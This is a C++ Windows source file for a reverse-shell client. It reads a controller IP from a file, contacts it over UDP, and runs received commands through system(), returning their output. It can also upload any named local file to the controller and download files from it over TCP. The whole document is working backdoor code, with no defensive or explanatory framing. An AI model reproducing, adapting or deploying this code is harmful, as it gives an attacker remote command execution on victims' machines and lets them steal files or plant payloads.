
#include<winsock2.h>
#include <stdio.h>
#pragma comment(lib,"ws2_32.lib")
#include<iostream>
using namespace std;
char serip[30]="10.13.28.32";
void sendf(char *name)
{
	WSADATA wsaData;
	SOCKET sClient;

	int i=0;
	int SeriPort=8080;
	
	//服务器端SOCKET地址结构
	struct sockaddr_in ser;

	if(WSAStartup(MAKEWORD(2,2),&wsaData)!=0)
	{
		return;
	}

	//填写要连接的服务器地址信息
	ser.sin_family=AF_INET;
	ser.sin_port=htons(SeriPort);
	ser.sin_addr.s_addr=inet_addr(serip);

	//建立客户端字节流式套接字
	sClient=socket(AF_INET,SOCK_STREAM,0);
	if(sClient==INVALID_SOCKET)
	{
		return;
	}

	//请求与服务器建立连接


	if(connect(sClient,(struct sockaddr *)&ser,sizeof(ser))==INVALID_SOCKET)
	{
		return;
	}
	else
	{	
		FILE *p=NULL;
		p=fopen(name,"rb");
		if(p==NULL)
			return ;
		char temp[30];
		memset(temp,0,30);
		int n=0;
		while(1)
		{
			n++;
			if(!feof(p))
			{
				int t=fread(temp,1,20,p);
				int t1=send(sClient,temp,t,0);
				memset(temp,0,30);
				if(t1!=20)
					break;
			}
			else
			{			
				break;	
			}
		}
		fclose(p);
	}
	
	closesocket(sClient);
	WSACleanup();
}

void recvf(char *name)
{
	WSADATA wsaData;
	SOCKET sClient;

	int i=0;
	int SeriPort=8080;
	
	//服务器端SOCKET地址结构
	struct sockaddr_in ser;

	if(WSAStartup(MAKEWORD(2,2),&wsaData)!=0)
	{
		return;
	}

	//填写要连接的服务器地址信息
	ser.sin_family=AF_INET;
	ser.sin_port=htons(SeriPort);
	ser.sin_addr.s_addr=inet_addr(serip);

	//建立客户端字节流式套接字
	sClient=socket(AF_INET,SOCK_STREAM,0);
	if(sClient==INVALID_SOCKET)
	{
		return;
	}

	//请求与服务器建立连接


	if(connect(sClient,(struct sockaddr *)&ser,sizeof(ser))==INVALID_SOCKET)
	{
		return;
	}
	else
	{	
		FILE *p=NULL;
		p=fopen(name,"wb");
		if(p==NULL)
			return ;
		
		int n=0,n1=0;
		while(1)
		{	  
			n1++;
			char temp[30];
			memset(temp,0,30);	
			int ircv=recv(sClient,temp,20,0);
			fwrite(temp,1,ircv,p);	
			if(ircv!=20)
			{
				fclose(p);
				break;
			}
		}
	}
	closesocket(sClient);

	WSACleanup();
}


int main()
{
	
	FILE *q=fopen("ip","rb");
	if(q==NULL)
	{
		printf("1234 wrong !\n");
		return 0;
	}
	fscanf(q,"%s",serip);
	fclose(q);

	WSADATA wsadata;
	SOCKET sclient;


	//服务器地址、端口号
	int  Seriport=8081;

	//服务器SOCKET地址结构长度
	int ilen;
	//发送/接收数据大小
	int isend;

	//服务器端的SOCKET地址结构
	struct sockaddr_in seradd;
	if(WSAStartup(MAKEWORD(2,2),&wsadata)!=0)
	{
		printf("failed to load winsock\n");
		return 0;
	}

	

	// 服务器SOCKET地址结构初始化
	seradd.sin_family=AF_INET;
	seradd.sin_port=htons(Seriport);
	seradd.sin_addr.s_addr=inet_addr(serip);

   

	sclient=socket(AF_INET,SOCK_DGRAM,0);
	if(sclient==INVALID_SOCKET)
	{
		printf("build socket failed!\n");
		return 0; 
	}

    int i=0,num=0;
	
	//无连接不需要进行地址与套接字的绑定，直接发送数据即可
	ilen=sizeof(seradd);
	while(1)
	{
		num++;
		char result[1024*100]={0}; 		
		char dir1[1000]={0};
		char cmd[1000]="cd";
		char cmd1[1000]={0};
		
		strcat(cmd,"  >test.txt");
		system(cmd);
		FILE *p;
		p=fopen("test.txt","rb");
		
		int n=fread(dir1,1,1000,p);
		for(i=0;i<n;i++)
			if(dir1[i]=='\n'||dir1[i]=='\r')
				dir1[i]='\0';
		fclose(p);

		
		isend=sendto(sclient,dir1,strlen(dir1),0,(struct sockaddr *)&seradd,ilen);
		if(isend<0)
		{
			printf("isend<0 %d\n",isend);
			break;
		}
		

		int c=recvfrom(sclient,cmd1,1000,0,(struct sockaddr*)&seradd,&ilen);

		if(strlen(cmd1)==0)
			continue;
		if(strcmp(cmd1,"cd")==0)
		{
			memset(cmd,0,1000);
			recvfrom(sclient,cmd,1000,0,(struct sockaddr*)&seradd,&ilen);
			SetCurrentDirectory(cmd);
		}
		else if(strcmp(cmd1,"cls")==0)
		{

		}
		else if(strcmp(cmd1,"file")==0)
		{
			memset(cmd,0,1000);
			recvfrom(sclient,cmd,1000,0,(struct sockaddr*)&seradd,&ilen);
			sendf(cmd);
		}
		else if(strcmp(cmd1,"sendfile")==0)
		{
			memset(cmd,0,1000);
			recvfrom(sclient,cmd,1000,0,(struct sockaddr*)&seradd,&ilen);
			Sleep(5000);
			recvf(cmd);
		}
		else if(strcmp(cmd1,"down")==0)
		{
			break;
		}
		else
		{
			strcat(cmd1," >test1.txt");
			system(cmd1);

			p=fopen("test1.txt","rb");
			int n=fread(result,1,102400,p);
			sendto(sclient,result,strlen(result),0,(struct sockaddr *)&seradd,ilen);
			fclose(p);
		}
		//isend=sendto(sclient,dir,strlen(dir),0,(struct sockaddr *)&seradd,ilen);
	}


	 closesocket(sclient);
	 WSACleanup();
	 return 0;
}
